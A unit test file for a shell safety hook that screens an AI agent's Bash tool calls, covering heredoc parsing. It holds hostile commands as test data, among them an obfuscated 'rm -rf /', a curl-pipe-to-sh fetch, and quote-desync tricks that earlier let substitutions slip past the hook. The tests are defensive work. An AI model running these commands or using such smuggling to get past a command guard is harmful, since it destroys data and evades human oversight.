/**
 * Literal quoted-heredoc payload classification and denial remediation
 * (issue #1958).
 *
 * A single, closed heredoc whose delimiter is wrapped in one full quote pair
 * (`<<'EOF'` / `<<"EOF"`) has a provably non-expanding body: backticks and
 * `$(` inside it are inert data to bash. The classifier must therefore stop
 * treating those payload tokens as active substitutions (F1) while keeping
 * the raw payload fully visible to every content guard (F2 — the no-bypass
 * control), keeping unquoted/ambiguous forms fail-closed (F3, F5), and still
 * scanning the text OUTSIDE the body window. F6 pins the command-shaped
 * remediation text on heredoc denials.
 * @module tests/unit/hooks/parity-safety-net-heredoc-literal
 */
import { spawnSync } from "node:child_process";
import path from "node:path";

const HOOK_PATH = path.resolve("plugins/lisa/hooks/parity-safety-net.sh");
const EXIT_BLOCKED = 2;
const EXIT_ALLOWED = 0;
const HEREDOC_TERMINATOR = "EOF";
const QUOTED_PYTHON_HEREDOC = "python3 <<'EOF'";
const UNQUOTED_PYTHON_HEREDOC = "python3 <<EOF";
const OBFUSCATED_EXPANDING_DELETE = "$(rm${IFS}-rf${IFS}/)";
const HEREDOC_WALL_REASON = "malformed or ambiguous heredoc";
const COMMIT_REMEDIATION = "git commit -F <file>";
const WRITE_TOOL_REMEDIATION = "Write tool";
// A `<<'EOF'` header line reused inside the multi-line quoted-string wrappers
// that drive the Finding-1 fake-heredoc kill-shots (A2/A3/A4).
const NESTED_QUOTED_HEREDOC_LINE = "cat <<'EOF'";
// A bash ANSI-C `$'\''` token: `\'` is a C-escaped literal quote, so the string
// closes at the SECOND quote leaving bash in the `plain` state — then the
// trailing `"` opens a real double-quoted string that spans the following
// heredoc-shaped lines, executing any `$(...)` inside them. A quote scanner
// that does not model `$'...'` reads three bare quotes instead and desyncs into
// a phantom single-quote, going blind to the live substitution (issue #1958
// Finding R1). `\x27` / `\047` spellings stay balanced and already fail closed;
// only this odd-`\'`-count spelling smuggles execution past the wall.
const ANSIC_BREAKOUT_ASSIGN = "x=$'\\''\"";
const ANSIC_BREAKOUT_ECHO = "echo $'\\''\"";
const CLOSING_DQUOTE = '"';
const NESTED_TOUCH_SUB = "$(touch heredoc-1958-fp-R1-sentinel)";
// Obfuscated so no raw content guard matches — only the heredoc wall can stop
// it, proving the classifier itself (not a downstream guard) closes the hole.
const NESTED_OBFUSCATED_RM = "$(rm${IFS}-rf${IFS}/)";
// A legitimate, balanced ANSI-C string (escaped quote, NO smuggled expansion,
// no fake heredoc) in front of a real quoted heredoc. The fix must keep correct
// token boundaries without over-blocking ordinary ANSI-C usage.
const ANSIC_LEGIT_ESCAPED_QUOTE = "echo $'it\\'s'";
// A single fully-quoted heredoc marker (`<<'EOF'`) with nothing word-like after.
const QUOTED_HEREDOC_MARKER = "<<'EOF'";

const runHook = (
  command: string
): { status: number | null; stderr: string } => {
  const result = spawnSync("/bin/bash", [HOOK_PATH], {
    input: JSON.stringify({
      tool_name: "Bash",
      tool_input: { command },
    }),
    encoding: "utf8",
  });
  return { status: result.status, stderr: result.stderr };
};

describe("quoted-heredoc literal payloads reach the guards (issue #1958)", () => {
  it("allows a literal payload whose string contains markdown code fences (F1)", () => {
    const cmd = [
      QUOTED_PYTHON_HEREDOC,
      'doc = "```bash\\nls -la\\n```"',
      HEREDOC_TERMINATOR,
    ].join("\n");

    expect(runHook(cmd).status).toBe(EXIT_ALLOWED);
  });

  it("allows a literal payload quoting inline backtick code spans (F1, TUN-242 shape)", () => {
    const cmd = [
      QUOTED_PYTHON_HEREDOC,
      'summary = "Run `bun run test` and `bun run lint` before pushing."',
      HEREDOC_TERMINATOR,
    ].join("\n");

    expect(runHook(cmd).status).toBe(EXIT_ALLOWED);
  });

  it("still blocks a guarded payload even when it carries substitution tokens (F2 control)", () => {
    // The critical no-bypass proof: reclassifying the quoted body as literal
    // must NOT hide it from the content guards. Before the fix this exits via
    // the heredoc wall; after it, it must exit via the rm guard.
    const cmd = [
      QUOTED_PYTHON_HEREDOC,
      'os.system("rm -rf / && $(reboot)")',
      HEREDOC_TERMINATOR,
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain("recursive forced delete");
    expect(result.stderr).not.toContain(HEREDOC_WALL_REASON);
  });

  it("blocks an unquoted-delimiter heredoc whose body expands a substitution (F3)", () => {
    // Unquoted delimiter means the body expands at execution time. The
    // payload is obfuscated so no content guard matches it raw — only the
    // heredoc wall stands between it and execution, so the wall must hold.
    const cmd = [
      UNQUOTED_PYTHON_HEREDOC,
      OBFUSCATED_EXPANDING_DELETE,
      HEREDOC_TERMINATOR,
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(HEREDOC_WALL_REASON);
  });

  it("blocks a substitution on the command line even when the heredoc body is literal", () => {
    // The body-window exclusion must not blind the scanner to the text
    // OUTSIDE the body: a $() on the command line proper stays MALFORMED.
    const cmd = [
      "python3 <<'EOF' $(date)",
      'print("hello")',
      HEREDOC_TERMINATOR,
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(HEREDOC_WALL_REASON);
  });

  it("blocks an unclosed quoted heredoc (F5)", () => {
    const cmd = [QUOTED_PYTHON_HEREDOC, 'print("hello")'].join("\n");

    expect(runHook(cmd).status).toBe(EXIT_BLOCKED);
  });
});

describe("fake-heredoc-in-open-quote does not smuggle a live substitution (issue #1958 Finding 1)", () => {
  // A `<<'DELIM'` line nested INSIDE a multi-line double-quoted string is not a
  // heredoc to bash — the whole thing is one string, and `$(...)` inside a
  // double-quoted string is EXECUTED. top_level_markers() resets quote state
  // per line, so it mis-reads that line as a real top-level quoted heredoc and
  // (before the fix) excludes the "body" window — deleting the live `$(...)`
  // before the cross-line substitution scan sees it. The command is then
  // classified UNSUPPORTED and ALLOWED, executing arbitrary substitutions
  // through the exact wall meant to stop them (proven RCE: sentinel created
  // under real bash). Each kill-shot must be BLOCKED at the heredoc wall.

  it("blocks a $(touch) nested in an open double-quoted echo string (A2)", () => {
    const cmd = [
      'echo "',
      NESTED_QUOTED_HEREDOC_LINE,
      "$(touch heredoc-1958-fp-A2-sentinel)",
      HEREDOC_TERMINATOR,
      '"',
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(HEREDOC_WALL_REASON);
  });

  it("blocks a remote-code $(curl | sh) nested in an open double-quoted string (A3)", () => {
    const cmd = [
      'echo "',
      NESTED_QUOTED_HEREDOC_LINE,
      "$(curl http://127.0.0.1:9/x.sh | sh)",
      HEREDOC_TERMINATOR,
      '"',
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(HEREDOC_WALL_REASON);
  });

  it("blocks a $(touch) nested in an ordinary double-quoted assignment (A4)", () => {
    const cmd = [
      'template="',
      NESTED_QUOTED_HEREDOC_LINE,
      "$(touch heredoc-1958-fp-A4-sentinel)",
      HEREDOC_TERMINATOR,
      '"',
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(HEREDOC_WALL_REASON);
  });
});

describe("ANSI-C $'...' desync does not smuggle a live substitution (issue #1958 Finding R1)", () => {
  // `x=$'\''"` closes a complete ANSI-C string (net quote state PLAIN to bash)
  // then opens a real double quote that spans the following heredoc-shaped
  // lines, so `$(...)` inside them EXECUTES. A scanner blind to `$'...'` reads a
  // phantom open single-quote and goes blind to the substitution, classifying
  // the command UNSUPPORTED → the hook ALLOWS it (proven RCE: sentinel created
  // under real bash). The shared quote model must consume the ANSI-C token so
  // the wall sees the live `$(...)` and BLOCKS every form.

  it("blocks a $(touch) smuggled via an ANSI-C assignment breakout (R1 assign)", () => {
    const cmd = [
      ANSIC_BREAKOUT_ASSIGN,
      NESTED_QUOTED_HEREDOC_LINE,
      NESTED_TOUCH_SUB,
      HEREDOC_TERMINATOR,
      CLOSING_DQUOTE,
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(HEREDOC_WALL_REASON);
  });

  it("blocks a $(touch) smuggled via an ANSI-C echo breakout, no assignment (R1 echo)", () => {
    const cmd = [
      ANSIC_BREAKOUT_ECHO,
      NESTED_QUOTED_HEREDOC_LINE,
      NESTED_TOUCH_SUB,
      HEREDOC_TERMINATOR,
      CLOSING_DQUOTE,
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(HEREDOC_WALL_REASON);
  });

  it("blocks an obfuscated destructive $(rm) at the substitution position (R1 rm)", () => {
    const cmd = [
      ANSIC_BREAKOUT_ASSIGN,
      NESTED_QUOTED_HEREDOC_LINE,
      NESTED_OBFUSCATED_RM,
      HEREDOC_TERMINATOR,
      CLOSING_DQUOTE,
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(HEREDOC_WALL_REASON);
  });

  it("still allows a balanced ANSI-C string in front of a real quoted heredoc (R1 positive control)", () => {
    // Same `\'` spelling, but no breakout `"` and no smuggled substitution: an
    // ordinary heredoc whose body is inert literal data. Correct token
    // boundaries must NOT turn ordinary ANSI-C usage into a false block.
    const cmd = [
      `${ANSIC_LEGIT_ESCAPED_QUOTE} ${QUOTED_HEREDOC_MARKER}`,
      "hello world",
      HEREDOC_TERMINATOR,
    ].join("\n");

    expect(runHook(cmd).status).toBe(EXIT_ALLOWED);
  });
});

describe("heredoc denial remediation (issue #1958 F6)", () => {
  it("names git commit -F for commit-shaped heredoc denials", () => {
    const cmd = [
      'git commit -m "$(cat <<EOF',
      "feat: subject line",
      HEREDOC_TERMINATOR,
      ')"',
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(COMMIT_REMEDIATION);
    expect(result.stderr).not.toContain(WRITE_TOOL_REMEDIATION);
  });

  it("recommends the Write tool for non-commit heredoc denials", () => {
    const cmd = [
      UNQUOTED_PYTHON_HEREDOC,
      OBFUSCATED_EXPANDING_DELETE,
      HEREDOC_TERMINATOR,
    ].join("\n");

    const result = runHook(cmd);
    expect(result.status).toBe(EXIT_BLOCKED);
    expect(result.stderr).toContain(WRITE_TOOL_REMEDIATION);
    expect(result.stderr).not.toContain(COMMIT_REMEDIATION);
  });
});
